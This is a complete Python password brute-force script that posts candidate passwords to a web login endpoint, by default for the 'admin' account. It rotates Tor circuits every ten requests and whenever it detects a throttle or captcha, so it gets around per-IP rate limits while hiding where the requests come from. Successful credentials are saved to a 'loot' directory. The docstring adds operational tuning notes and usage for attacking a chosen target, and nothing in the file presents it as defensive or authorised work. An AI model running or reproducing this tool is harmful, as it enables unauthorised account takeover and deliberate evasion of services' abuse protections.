#!/usr/bin/env python3
"""Tor batch-rotation brute engine — v23 design, battle-tested 2026-10 (bidi/fragment).

DOCTRINE (why this shape):
- ONE keep-alive Session per process, reused for a BATCH of ~10 requests
  (aligns with the common 10 req/60s per-IP budget), then:
      NEWNYM -> sleep ~2.2s -> close Session -> new Session
  The fresh TCP connection then rides a NEW circuit (new exit IP).
- NEWNYM does NOT kill established connections: a long-lived conn keeps
  working while other processes rotate. This is what makes several
  processes/instances sharing one Tor daemon safe.
- NEVER combine "new connection per request (Connection: close)" + multiple
  processes + frequent NEWNYM: circuit starvation hangs SOCKS handshakes
  (stuck in socks.py _SOCKS5_request) -> ConnectTimeout storms, zero rps.
- socket.setdefaulttimeout(15) backstops stuck handshakes (requests timeout
  does not reliably cover the SOCKS negotiation layer).
- On exception/throttle: RE-QUEUE the credential (silent excepts eat entries)
  and log the first N exceptions (else it looks like an unexplained freeze).
- Scale = one PROCESS per target (share the Tor daemon; batch design keeps them
  from starving each other).

Usage:
  python3 tor_batch_brute.py --url https://target --path /api/v1/system/auth/login \
      --list /tmp/list.txt --out loot/dir --ok-marker access_token \
      --bad-marker 账号或密码错误 --user admin [--user-field username] \
      [--pass-field password] [--referer https://target/docs] \
      [--extra login_type=PC端 ...] [--tor-port 9050] [--batch 10] \
      [--throttle-markers 过于频繁,429,验证码]

Exit: 0 = list exhausted (no hit) | 2 = HIT (saved out/LOGIN_OK.json) | 3 = other stop.
Resume: re-run with same --out; tried file skips completed entries.
"""
import argparse, os, sys, time, socket, threading
from collections import deque
import requests, urllib3

urllib3.disable_warnings()


def log(out, m):
    line = f'[{time.strftime("%H:%M:%S")}] {m}'
    print(line, flush=True)
    with open(os.path.join(out, 'tor_brute.log'), 'a') as f:
        f.write(line + '\n')


def newnym(ctrl_port):
    try:
        s = socket.create_connection(('127.0.0.1', ctrl_port), timeout=10)
        s.sendall(b'AUTHENTICATE\r\nSIGNAL NEWNYM\r\nQUIT\r\n')
        time.sleep(0.3)
        try:
            s.recv(512)
        except Exception:
            pass
        s.close()
    except Exception:
        pass


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--url', required=True)
    ap.add_argument('--path', required=True)
    ap.add_argument('--list', required=True)
    ap.add_argument('--out', required=True)
    ap.add_argument('--ok-marker', default='access_token')
    ap.add_argument('--bad-marker', required=True)
    ap.add_argument('--user', default='admin')
    ap.add_argument('--user-field', default='username')
    ap.add_argument('--pass-field', default='password')
    ap.add_argument('--referer', default=None)
    ap.add_argument('--extra', nargs='*', default=[])
    ap.add_argument('--tor-port', type=int, default=9050)
    ap.add_argument('--ctrl-port', type=int, default=0)  # 0 => tor_port + 1
    ap.add_argument('--batch', type=int, default=10)
    ap.add_argument('--throttle-markers', default='过于频繁,429,验证码')
    a = ap.parse_args()
    ctrl = a.ctrl_port or (a.tor_port + 1)
    os.makedirs(a.out, exist_ok=True)
    socket.setdefaulttimeout(15)

    headers = {'User-Agent': 'Mozilla/5.0 Chrome/120',
               'Content-Type': 'application/x-www-form-urlencoded'}
    if a.referer:
        headers['Referer'] = a.referer
    extras = dict(kv.split('=', 1) for kv in a.extra)
    throttle = [m for m in a.throttle_markers.split(',') if m]

    tried_path = os.path.join(a.out, 'tor_tried.txt')
    done = set(open(tried_path).read().splitlines()) if os.path.exists(tried_path) else set()
    todo = deque(l.strip() for l in open(a.list) if l.strip() and l.strip() not in done)

    stop = threading.Event()
    stats = {'done': 0, 'start': time.time(), 'throttle': 0, 'err': 0, 'rot': 0}

    def make_session():
        s = requests.Session()
        s.proxies.update({'https': f'socks5h://127.0.0.1:{a.tor_port}',
                          'http': f'socks5h://127.0.0.1:{a.tor_port}'})
        return s

    def rotate(sess):
        newnym(ctrl)
        time.sleep(2.2)
        try:
            sess.close()
        except Exception:
            pass
        stats['rot'] += 1

    def worker():
        sess = make_session()
        cnt = 0
        while todo and not stop.is_set():
            pwd = todo.popleft()
            try:
                data = {a.user_field: a.user, a.pass_field: pwd, **extras}
                r = sess.post(a.url + a.path, data=data, timeout=(10, 25),
                              verify=False, headers=headers)
                t = r.text
                cnt += 1
                if a.ok_marker in t:
                    open(os.path.join(a.out, 'LOGIN_OK.json'), 'w').write(t[:4000])
                    log(a.out, f'*** HIT {a.user}:{pwd} ***')
                    stats['hit'] = pwd
                    stop.set()
                    return
                if r.status_code == 429 or any(m in t for m in throttle):
                    stats['throttle'] += 1
                    todo.append(pwd)
                    rotate(sess)
                    sess = make_session()
                    cnt = 0
                    time.sleep(1.2)
                    continue
                if a.bad_marker not in t:
                    log(a.out, f'odd for {pwd!r}: {r.status_code} {t[:120]}')
                stats['done'] += 1
                with open(tried_path, 'a') as f:
                    f.write(pwd + '\n')
                if stats['done'] % 50 == 0:
                    rate = stats['done'] / max(1, time.time() - stats['start'])
                    log(a.out, f'progress: {stats["done"]} tried, {rate:.2f}/s, '
                               f'throttle={stats["throttle"]}, rot={stats["rot"]}, err={stats["err"]}')
                if cnt >= a.batch:
                    rotate(sess)
                    sess = make_session()
                    cnt = 0
            except Exception as e:
                stats['err'] += 1
                if stats['err'] <= 10:
                    log(a.out, f'EXC #{stats["err"]}: {type(e).__name__} {str(e)[:110]}')
                todo.append(pwd)
                try:
                    sess.close()
                except Exception:
                    pass
                time.sleep(1.5)
                sess = make_session()
                cnt = 0

    log(a.out, f'=== tor batch brute start: {len(todo)} (tor {a.tor_port}) ===')
    t = threading.Thread(target=worker, daemon=True)
    t.start()
    t.join()
    if stop.is_set():
        log(a.out, '=== HIT ===')
        sys.exit(2)
    log(a.out, '=== list exhausted ===')
    sys.exit(0)


if __name__ == '__main__':
    main()
